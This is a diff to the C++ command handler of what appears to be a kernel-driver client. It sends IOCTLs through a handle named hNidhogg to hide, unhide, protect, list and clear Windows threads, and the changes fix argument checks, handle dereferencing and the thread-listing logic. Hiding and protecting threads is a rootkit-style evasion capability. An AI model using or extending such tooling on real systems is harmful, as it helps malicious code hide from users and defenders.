@@ -53,7 +53,7 @@ void ThreadHandler::HandleCommand(_In_ std::string command) {
 			std::cerr << "Failed to reveal thread " << tid << std::endl;
 	}
 	else if (commandName.compare("list") == 0) {
-		if (params.size() != 2) {
+		if (params.size() != 1) {
 			std::cerr << "Invalid usage" << std::endl;
 			PrintHelp();
 			return;
@@ -77,7 +77,7 @@ void ThreadHandler::HandleCommand(_In_ std::string command) {
 			}
 			return;
 		}
-		else if (threadType.compare("protected") != 0) {
+		else if (threadType.compare("protected") == 0) {
 			std::vector<DWORD> protectedThreads;
 
 			try {
@@ -99,7 +99,7 @@ void ThreadHandler::HandleCommand(_In_ std::string command) {
 		}
 	}
 	else if (commandName.compare("clear") == 0) {
-		if (params.size() != 2) {
+		if (params.size() != 1) {
 			std::cerr << "Invalid usage" << std::endl;
 			PrintHelp();
 			return;
@@ -140,11 +140,11 @@ void ThreadHandler::HandleCommand(_In_ std::string command) {
 * @bool											 -- Whether the input parameters are valid or not.
 */
 bool ThreadHandler::CheckInput(_In_ const std::vector<std::string>& params) {
-	if (params.size() != 2) {
+	if (params.size() != 1) {
 		std::cerr << "Invalid usage" << std::endl;
 		return false;
 	}
-	return std::all_of(params.at(1).begin(), params.at(1).end(), ::isdigit);
+	return std::all_of(params.at(0).begin(), params.at(0).end(), ::isdigit);
 }
 
 /*
@@ -161,7 +161,7 @@ bool ThreadHandler::CheckInput(_In_ const std::vector<std::string>& params) {
 bool ThreadHandler::Protect(_In_ DWORD tid, _In_ bool protect) {
 	DWORD returned;
 	IoctlThreadEntry protectedThread = { tid, protect };
-	return DeviceIoControl(this->hNidhogg.get(), IOCTL_PROTECT_UNPROTECT_THREAD, &protectedThread, sizeof(protectedThread),
+	return DeviceIoControl(*hNidhogg.get(), IOCTL_PROTECT_UNPROTECT_THREAD, &protectedThread, sizeof(protectedThread),
 		nullptr, 0, &returned, nullptr);
 }
 
@@ -179,7 +179,7 @@ bool ThreadHandler::Protect(_In_ DWORD tid, _In_ bool protect) {
 bool ThreadHandler::Hide(_In_ DWORD tid, _In_ bool hide) {
 	DWORD returned;
 	IoctlThreadEntry hiddenThread = { tid, hide };
-	return DeviceIoControl(this->hNidhogg.get(), IOCTL_HIDE_UNHIDE_THREAD, &hiddenThread, sizeof(hiddenThread), nullptr, 0,
+	return DeviceIoControl(*hNidhogg.get(), IOCTL_HIDE_UNHIDE_THREAD, &hiddenThread, sizeof(hiddenThread), nullptr, 0,
 		&returned, nullptr);
 }
 
@@ -199,17 +199,22 @@ std::vector<DWORD> ThreadHandler::ListThreads(_In_ ThreadType type) {
 	IoctlThreadList result{};
 	result.Type = type;
 
-	if (!DeviceIoControl(this->hNidhogg.get(), IOCTL_LIST_THREADS, nullptr, 0, &result, sizeof(result), &returned,
+	if (!DeviceIoControl(*hNidhogg.get(), IOCTL_LIST_THREADS, &result, sizeof(result), &result, sizeof(result), &returned,
 		nullptr)) {
 		return tids;
 	}
+
 	if (result.Count > 0) {
 		try {
 			result.Threads = SafeAlloc<DWORD*>(result.Count * sizeof(DWORD));
 		}
 		catch (const SafeMemoryException&) {
-			std::cerr << "Failed to allocate memory for thread list" << std::endl;
-			return tids;
+			throw ThreadHandlerException("Failed to allocate thread list");
+		}
+		if (!DeviceIoControl(*hNidhogg.get(), IOCTL_LIST_THREADS, &result, sizeof(result), &result, sizeof(result), &returned,
+			nullptr)) {
+			SafeFree(result.Threads);
+			throw ThreadHandlerException("Failed to get thread list");
 		}
 		for (ULONG i = 0; i < result.Count; i++)
 			tids.push_back(result.Threads[i]);
@@ -230,5 +235,5 @@ std::vector<DWORD> ThreadHandler::ListThreads(_In_ ThreadType type) {
  */
 bool ThreadHandler::ClearThreads(_In_ ThreadType type) {
 	DWORD returned;
-	return DeviceIoControl(this->hNidhogg.get(), IOCTL_CLEAR_THREADS, &type, sizeof(type), nullptr, 0, &returned, nullptr);
+	return DeviceIoControl(*hNidhogg.get(), IOCTL_CLEAR_THREADS, &type, sizeof(type), nullptr, 0, &returned, nullptr);
 }
